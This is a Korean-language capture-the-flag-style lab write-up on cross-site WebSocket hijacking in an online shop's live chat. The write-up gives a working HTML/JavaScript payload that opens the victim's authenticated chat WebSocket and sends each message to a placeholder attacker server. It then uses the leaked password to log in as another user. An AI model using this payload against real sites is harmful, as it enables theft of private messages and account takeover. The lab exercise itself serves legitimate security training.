# 🚩Lab: Cross-site WebSocket hijacking
```text
This online shop has a live chat feature implemented using WebSockets.

To solve the lab, use the exploit server to host an HTML/JavaScript payload that uses a cross-site WebSocket hijacking attack to exfiltrate the victim's chat history, 
then use this gain access to their account
```

### 🔍 분석 및 공격 과정
1. livechat 기능으로 이동.
2. 웹소켓을 생성해 `'READY'` 라는 문자열을 서버로 전송후 채팅을 실시함.
3. 웹소켓 프로토콜로 업그레이딩할 때 세션쿠키를 포함시킨다. 그러나 이 세션쿠키는 `samesite=none`으로 크로스사이트의 요청에서 쿠키 전송이 가능함.
4. 그렇다는건 공격자의 웹페이지에서 타겟 웹사이트의 chat 웹소켓으로 연결을 시도하는 것이 가능하며, 민감한 텍스트를 추출할 수 있다는 것임.
5. 바로 스크립트 작성.
```html
<script>
var ws = new WebSocket('wss://lab-주소/chat');
ws.onopen = () => { ws.send('READY'); };
ws.onmessage = (event) => {fetch('공격자의 서버/log?'+event.data, {method: 'get', mode: 'no-cors'});};
</script>
```
6. 공격서버 로그로 이동하면 event.data에 content 항목으로써 채팅기록을 평문으로 볼 수 있음.
7. 대화 내용을 살펴보니 carlos는 비밀번호를 까먹었다고 live챗에서 문의하며, 그 비밀번호를 어드민으로 보이는 사람이 알려주고 있음.
8. 유출된 비밀번호를 사용해 carlos로 로그인 -> solve

### 💡 취약점 원리
  web소켓을 생성할 때 samesite가 none으로 설정된 쿠키를 바탕으로 생성해내기에 크로스사이트에서 발생한 cswsh에 취약했다. 
